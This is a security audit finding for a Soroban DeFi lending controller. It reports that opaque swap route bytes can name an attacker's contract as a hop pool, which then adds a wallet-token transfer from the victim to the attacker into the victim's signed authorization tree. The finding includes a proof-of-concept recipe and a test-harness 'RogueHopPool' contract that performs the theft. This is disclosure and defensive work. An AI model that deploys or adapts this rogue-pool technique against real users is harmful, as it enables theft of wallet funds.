### Title
Unvalidated swap routes can inject unauthorized token transfers into the caller’s signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
High. `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept opaque route bytes and forward them to the configured router without an on-chain venue or pool allowlist [1](#0-0) [2](#0-1) . A malicious route can name attacker-controlled code as a hop pool, and that code can request a `transfer` from the account owner beneath the owner’s `require_auth` root [3](#0-2) .

### Finding Description
`process_swap_collateral` authenticates the caller and verifies account ownership, then forwards the caller-supplied `swap` bytes into the shared strategy router path [4](#0-3) . The controller correctly limits its own grant to one exact `token_in.transfer(controller, router, amount_in)`, but it does not decode or constrain which pool addresses the route instructs the router to call [5](#0-4) . Because venue execution remains on the call stack under the caller’s authorization, attacker-selected code can add an unrelated token transfer from the caller to the simulated authorization tree [6](#0-5) .

The harness demonstrates this exact boundary: a route-selected rogue pool calls `token.transfer(victim, attacker, amount)`, simulation records that transfer as a child of the victim’s `swap_collateral` authorization, and signing the returned tree executes the theft [7](#0-6) [8](#0-7) .

### Impact Explanation
An attacker can steal unrelated wallet tokens from a user who submits a poisoned strategy route and signs the authorization tree produced by simulation [9](#0-8) . The loss is not bounded by the collateral being swapped, the route’s minimum output, or the account’s post-strategy health checks [3](#0-2) .

### Likelihood Explanation
Exploitation requires the victim to use attacker-supplied route bytes and approve a visibly poisoned authorization tree, so it is not fully unilateral [10](#0-9) . Nevertheless, route bytes are opaque input to every affected strategy, and users commonly rely on quoting and simulation flows to construct them [11](#0-10) . The practical risk is sufficient for a High finding because the enabled consequence is arbitrary theft from the signer’s wallet.

### Recommendation
Do not allow route payloads to select arbitrary venue contracts. Maintain a governance-approved pool/venue registry and reject any hop whose target address is not registered, or constrain route construction to fixed trusted adapter targets. Client-side verification can mitigate signing risk, but it cannot replace an on-chain execution boundary because the controller itself forwards opaque bytes without inspecting the route [1](#0-0) [12](#0-11) .

### Proof of Concept
1. Deploy a contract exposing the expected venue call shape; in its `swap` method, invoke `token.transfer(victim, attacker, victim_balance)` on an unrelated token held by the victim [13](#0-12) .
2. Construct a `swap_collateral` route that names this contract as the hop pool while still returning a fair output so the strategy’s measured-output and account-risk checks pass [14](#0-13) .
3. Simulate the call and inspect the generated authorization tree; it contains the unrelated wallet-token transfer as a child of the victim’s `swap_collateral` authorization [15](#0-14) .
4. Submit the transaction with that signed tree; the unrelated token balance moves to the attacker while the strategy completes [9](#0-8) .

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** interfaces/controller/src/lib.rs (L88-106)
```rust
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    );

    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    );
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L230-269)
```rust
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** skills/xoxno-swap-aggregator/composition.md (L53-59)
```markdown
`routeXdr` is present when `slippage` was sent (always for swaps; optional for
`convertLiquidity`; `pipeline.rs` clears it when `slippage` is absent). Pass it
untouched: `steps: { routeXdr: quote.routeXdr }` or
`mapQuoteResponseToStrategySwap(quote)` (returns `{ routeXdr }` when present). The
builders decode base64 into Soroban `Bytes` via `asStellarStrategySwapBytes`; the
controller forwards those bytes to the router as `swap_xdr` without decoding them.
Set `referralId` on the quote request: the server encodes it into `routeXdr`, and the
```
